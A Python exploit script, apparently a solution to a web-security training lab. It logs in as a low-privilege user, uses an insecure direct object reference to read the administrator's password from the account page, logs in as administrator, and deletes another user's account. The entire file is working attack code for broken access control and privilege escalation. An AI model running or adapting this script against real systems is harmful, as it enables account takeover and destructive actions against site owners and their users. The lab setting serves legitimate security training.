import requests
import re
import sys
import urllib3
from bs4 import BeautifulSoup
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
password="" #to store admin password globally 


proxy = {'http':'http://127.0.0.1:8080'
         
         
         }


def get_csrf_token(session, url):
    """Fetching csrf token from webiste"""
    print("(+) Fetching csrf token ...")
    response = session.get(url+"/login" , verify=False)
    soup = BeautifulSoup(response.text, "html.parser")
    csrf_token = soup.find("input",{"name":"csrf"})["value"]
    return csrf_token


def exploit_admin_account(session,url):
    csrf_token = get_csrf_token(session , url)
    print("(+) Attempting to Login wiener Account..")
    login_url = url+"/login"
    
    login_data = {
        "username":"wiener",
        "password":"peter",
        "csrf":csrf_token
    }
    try:
        response = session.post(url=login_url , data=login_data , verify=False)
        if "Log out" in response.text:
            print("(+) Login Successfully ..")
            print("(+) Finding the Administrator Password...")
            cookie = response.cookies.get_dict().get('session')
            admin_url = url +"/my-account?id=administrator"
            response = session.get(admin_url, cookies=cookie ,verify=False)
            if "administrator" in response.text:
                soup = BeautifulSoup(response.text , "html.parser")
                password = soup.find("input",{"name":"password"})["value"]
                print(f"(+) Administrator Password Found: {password}")
                print("(+) Attempting to login Administrator Account ...")
                login_url = url+"/login"
                csrf_token = get_csrf_token(session , url)
                admin_data = {
                    "username":"administrator",
                    "password":password,
                    "csrf":csrf_token
                }
                
                res = session.post(url=login_url , data=admin_data, verify=False)
                if "administrator" in res.text:
                    print("(+) Admin login Successfully...")
                    print("(+) Deleting Carlos Account")
                    cookie = res.cookies.get_dict().get('session')
                    account_url = url+"/admin/delete?username=carlos"
                    request = session.get(url=account_url , cookies=cookie , verify=False)
                    if "Congratulations, you solved the lab!" in request.text:
                        print("(+) Congratulations, you solved the lab!")
                        
                elif "Invalid username or password." in res.text:
                    print("(-) Invalid username or password.")
                else:
                    print("Failed to Login Administrator Account")
            else:
                print("(-) Failed to Find Administrator Password")
       

        else:
            print("(+) Login Failed...")
            sys.exit(-1)
    except(requests.exceptions.RequestException) as e:
        print(f"(-) Error occur during login Please check your Connetivity.{e}")
    




def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>"% sys.argv[0])
        print("(+) Example: %s www.example.com"% sys.argv[0])
    url = sys.argv[1]
    session = requests.Session()
    try:

        print("Validating the Target ..")
        response = session.get(url)
        if response.status_code ==200:
            print("(+) Target is Reachable ")
        else:
            print("(-) Target is Unreachable")
            sys.exit(-1)
    except(requests.exceptions.ConnectTimeout):
        print("Connection Timeout ...")
    exploit_admin_account(session,url)

if __name__ == "__main__":
    main()